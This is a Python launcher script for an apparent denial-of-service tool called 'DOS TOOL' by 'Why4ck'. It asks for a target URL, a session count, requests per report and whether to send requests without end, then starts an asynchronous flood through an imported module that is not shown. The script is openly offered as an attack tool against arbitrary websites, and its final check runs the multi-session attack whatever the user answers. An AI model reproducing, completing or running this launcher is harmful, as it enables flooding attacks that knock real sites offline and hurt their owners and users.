from . import dos
from . import multi
from . import super
import colorama
import logging
import traceback
from colorama import init, Fore, Style

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('dos_attack.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)
colorama.init()

name_title = """██     ██ ██   ██ ██    ██ ██   ██  ██████ ██   ██ 
██     ██ ██   ██  ██  ██  ██   ██ ██      ██  ██  
██  █  ██ ███████   ████   ███████ ██      █████   
██ ███ ██ ██   ██    ██         ██ ██      ██  ██  
 ███ ███  ██   ██    ██         ██  ██████ ██   ██ 
                                                   
                                                   """
project_title = """██████   ██████  ███████     ████████  ██████   ██████  ██      
██   ██ ██    ██ ██             ██    ██    ██ ██    ██ ██      
██   ██ ██    ██ ███████        ██    ██    ██ ██    ██ ██      
██   ██ ██    ██      ██        ██    ██    ██ ██    ██ ██      
██████   ██████  ███████        ██     ██████   ██████  ███████ 
                                                                
                                                                """
other = "Why4ck\nGithub: https://github.com/why4ck Tg: https://t.me/mcodeg"


print(Fore.RED, "By continuing, you agree to the terms and conditions on the website: https://telegra.ph/User-Agree-03-09", Style.RESET_ALL, sep="", end="\n\n")

print(Fore.GREEN, name_title, Style.RESET_ALL, sep="")
print(Fore.GREEN, project_title, Style.RESET_ALL, sep="")
print(Fore.BLUE, other, Style.RESET_ALL, sep="", end="\n\n")

session_is_multu = None
session_count = None
q_per_report = None
is_infinity = None
yspex = None
yspex2 = None
yspex3 = None
yspex4 = None
yspex5 = None
url = None
yspex5 = None

try:
    site = input("Url for attack [https:// OR http://]: ")
    
    # session_is_multu
    while yspex3 != True:
        session_is_multu = input("Multi session [y/n]: ")
        if session_is_multu == "y" or session_is_multu == "n":
            yspex3 = True
    
    
    # requests for report
    while yspex != True:
        try:
            q_per_report = int(input("How many requests for the report [int]: "))
            if q_per_report >= 1:
                yspex = True
        except ValueError:
            print(Fore.RED, "Input a number", Style.RESET_ALL, sep="")
        except KeyboardInterrupt:
            print(Fore.RED, "\nEXIT", Style.RESET_ALL, sep="")
        except:
            print(Fore.RED, "\nERROR", Style.RESET_ALL, sep="")
            
    
    # inlinity or not
    while yspex4 != True:
        is_infinity = input("Infinity requests [y/n]: ")
        if is_infinity == "y" or is_infinity == "n":
            yspex4 = True
    
    
    if session_is_multu == "y":
        while yspex2 != True:
            try:
                session_count = int(input("How namy session [int]: "))
                if session_count >= 1:
                    yspex2 = True
            except ValueError:
                print(Fore.RED, "Input a number", Style.RESET_ALL, sep="")
            except KeyboardInterrupt:
                print(Fore.RED, "\nEXIT", Style.RESET_ALL, sep="")
            except:
                print(Fore.RED, "\nERROR", Style.RESET_ALL, sep="")
    
    
    
except KeyboardInterrupt:
    print(Fore.RED, "\nEXIT", Style.RESET_ALL, sep="")
    logger.info("Пользователь прервал выполнение")
except ValueError as e:
    print(Fore.RED, "\nERROR: Неверное значение", Style.RESET_ALL, sep="")
    logger.error(f"ValueError: {e}")
except Exception as e:
    print(Fore.RED, "\nERROR", Style.RESET_ALL, sep="")
    logger.error(f"Неизвестная ошибка: {e}")
    logger.debug(traceback.format_exc())


if session_is_multu:
    import asyncio
    asyncio.run(multi.use(req_per_con=q_per_report, is_inf=is_infinity, url=site, session=session_count))